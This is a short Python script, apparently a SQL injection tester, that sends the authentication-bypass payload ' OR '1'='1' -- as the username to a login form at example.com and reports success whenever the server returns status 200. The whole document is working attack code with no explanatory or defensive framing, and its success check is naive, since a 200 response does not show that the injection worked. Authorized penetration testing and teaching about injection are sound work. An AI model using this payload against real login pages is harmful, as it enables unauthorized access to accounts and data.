import requests

url = "http://example.com/login"  

payload = "' OR '1'='1' -- "

data = {
    "username": payload,
    "password": "irrelevant"
}

response = requests.post(url, data=data)

if response.status_code == 200:
    print("[+] SQL Injection Test Successful!")
    print(f"Response: {response.text}")
else:
    print("[-] SQL Injection Test Failed.")
    print(f"HTTP Status Code: {response.status_code}")
